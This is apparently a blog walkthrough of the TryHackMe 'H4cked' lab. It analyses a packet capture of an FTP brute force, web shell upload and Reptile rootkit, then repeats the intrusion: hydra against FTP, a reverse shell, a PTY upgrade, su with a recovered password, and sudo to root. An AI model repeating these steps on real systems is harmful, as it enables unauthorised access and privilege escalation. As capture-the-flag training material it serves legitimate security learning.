---
layout: post
title: H4cked
date: 2021-03-26 00:00:01 +5:30
categories: [Tryhackme, Easy]
tags: [pcap, wireshark, ftp] # add tag
---


## Walkthrough

### TASK I (Analysing the pcap)

Loaded the pcap in wireshark and started by following the tcp stream

![PCAP1](/assets/img/hacked/pcap1.png)

The attacker was bruteforcing FTP might be using hydra.<br />

![PCAP2](/assets/img/hacked/pcap2.png)
They got successful login into ftp

![PCAP3](/assets/img/hacked/pcap3.png)
By Analysing the action it seems the attacker uploaded a shell in web directory and got remote access.

Then it seems they uploaded a rootkit named reptile to maintain access.

### TASK II (Hack Again)

Again let's start by attacking ftp using hydra.
![hacked1](/assets/img/hacked/hacked1.png)

Changing the IP

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@wir3:/$ ls -la
ls -la
total 1529952
drwxr-xr-x  22 root root       4096 Feb  2 10:28 .
drwxr-xr-x  22 root root       4096 Feb  2 10:28 ..
drwxr-xr-x   2 root root       4096 Feb  1 20:11 bin
drwxr-xr-x   3 root root       4096 Feb  1 20:15 boot
drwxr-xr-x  17 root root       3700 Mar 26 04:16 dev
drwxr-xr-x  94 root root       4096 Feb  2 10:52 etc
drwxr-xr-x   3 root root       4096 Feb  1 20:05 home
lrwxrwxrwx   1 root root         34 Feb  1 19:52 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic
drwxr-xr-x  22 root root       4096 Feb  1 22:06 lib
drwxr-xr-x   2 root root       4096 Feb  1 20:08 lib64
drwx------   2 root root      16384 Feb  1 19:49 lost+found
drwxr-xr-x   2 root root       4096 Jul 25  2018 media
drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt
drwxr-xr-x   2 root root       4096 Jul 25  2018 opt
dr-xr-xr-x 110 root root          0 Mar 26 04:15 proc
drwx------   3 root root       4096 Feb  2 10:23 root
drwxr-xr-x  27 root root        840 Mar 26 04:21 run
drwxr-xr-x   2 root root      12288 Feb  1 20:11 sbin
drwxr-xr-x   3 root root       4096 Feb  1 20:07 srv
-rw-------   1 root root 1566572544 Feb  1 19:52 swap.img
dr-xr-xr-x  13 root root          0 Mar 26 04:16 sys
drwxrwxrwt   2 root root       4096 Mar 26 04:17 tmp
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
drwxr-xr-x  13 root root       4096 Feb  2 10:28 var
lrwxrwxrwx   1 root root         31 Feb  1 19:52 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
www-data@wir3:/$ sudo -l
sudo -l
[sudo] password for www-data:





Sorry, try again.
[sudo] password for www-data:
Sorry, try again.
[sudo] password for www-data:

sudo: 3 incorrect password attempts
www-data@wir3:/$ su jenny
su jenny
Password: 987654321

jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ sudo -i
sudo -i
root@wir3:~# ls
ls
Reptile
root@wir3:~# ls -la
ls -la
total 20
drwx------  3 root root 4096 Feb  2 10:23 .
drwxr-xr-x 22 root root 4096 Feb  2 10:28 ..
lrwxrwxrwx  1 root root    9 Feb  2 10:20 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  7 root root 4096 Feb  2 10:23 Reptile
root@wir3:~# cd Re
cd Reptile/
root@wir3:~/Reptile# ls
ls
configs   Kconfig  Makefile  README.md  userland
flag.txt  kernel   output    scripts
```
